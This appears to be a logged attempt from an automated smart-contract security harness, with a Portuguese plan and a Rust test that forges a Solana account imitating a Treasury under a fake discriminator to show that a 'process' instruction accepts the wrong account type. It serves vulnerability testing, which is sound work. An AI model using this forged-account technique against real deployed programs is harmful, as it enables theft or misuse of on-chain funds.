attempts.raw:
{
  "plan": "Preparamos uma conta Treasury legítima via initialize (baseline) e, em seguida, criamos uma conta falsa cujo layout imita Treasury mas pertence a outro programa (ou tem discriminador diferente), com is_active=true. No ataque, passamos essa conta falsa como `treasury` para `process`, que não valida o discriminador. O efeito medido é que a instrução aceita a conta de outro tipo (COSPLAY), confirmando a vulnerabilidade.",
  "scenario": "let authority = Pubkey::new_unique();
let treasury = Pubkey::new_unique();

// Baseline: inicializa uma Treasury legítima
let init_ix = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(treasury, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program::ID, false),
    ],
);
let init_accounts = vec![
    (treasury, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let baseline_result = env.baseline("initialize treasury", &init_ix, &init_accounts);
assert!(baseline_result.program_result == ProgramResult::Success);

// Conta falsa: mesmo layout de Treasury, mas com discriminador de outro tipo
let fake_treasury = Pubkey::new_unique();
let mut fake_data = vec![0u8; 8 + 32 + 8 + 1];
fake_data[0..8].copy_from_slice(&[0xAA; 8]); // discriminador falso
fake_data[8..40].copy_from_slice(authority.as_ref());
fake_data[40..48].copy_from_slice(&500u64.to_le_bytes());
fake_data[48] = 1; // is_active = true
let fake_account = account(&env.program_id, &fake_data, None);

// Ataque: process com a conta falsa
let attack_ix = env.anchor_ix(
    "process",
    &(),
    vec![
        AccountMeta::new_readonly(fake_treasury, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let attack_accounts = vec![
    (fake_treasury, fake_account),
    (authority, wallet(1_000_000_000)),
];
let attack_result = env.attack("process with fake treasury", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    env.effect(
        "process accepted a fake treasury account (COSPLAY)",
        true,
    );
} else {
    env.effect(
        "process rejected the fake treasury account",
        false,
    );
}"
}

